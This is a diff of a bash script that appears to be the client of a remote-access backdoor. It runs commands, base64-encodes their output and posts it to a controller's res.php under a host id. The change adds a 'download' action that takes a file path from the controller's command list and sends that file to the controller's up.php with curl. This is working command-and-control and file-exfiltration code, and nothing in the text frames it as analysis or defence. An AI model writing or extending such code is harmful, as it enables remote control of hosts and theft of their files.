@@ -21,8 +21,10 @@ res=$($run 2>&1| base64 | tr -d '\n')
 curl -sk -X POST $2/res.php -d "res=$(echo $res)&id=$1" > /dev/null
 sleep 10
 
-elif [[ $act == "upload" ]];
+elif [[ $act == "download" ]];
 then
-curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading" | base64)&id=$1" > /dev/null
+file=$(echo $cmds | grep $1 | cut -f 3- -d ":")
+curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading $file" | base64)&id=$1" > /dev/null
+curl -sk -F data=@$(echo -n $file) $2/up.php?id=$1 > /dev/null
 fi
 done
